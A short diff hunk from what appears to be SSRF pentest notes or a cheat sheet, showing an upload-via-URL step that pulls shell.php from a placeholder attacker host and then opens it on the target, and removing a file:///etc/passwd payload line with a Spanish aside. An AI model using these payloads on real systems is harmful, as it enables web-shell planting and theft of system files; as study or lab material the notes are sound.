@@ -80,11 +80,6 @@ http://<LAB_IP>:8000/shell.php
 /upload?url=http://<your-ip>:8000/shell.php
 ``` 
 - Then access `/uploads/shell.php` on the target.
-```bash
-file:///etc/passwd
-da mas opciones
-``` 
-
 
 
 ## SSRFmap
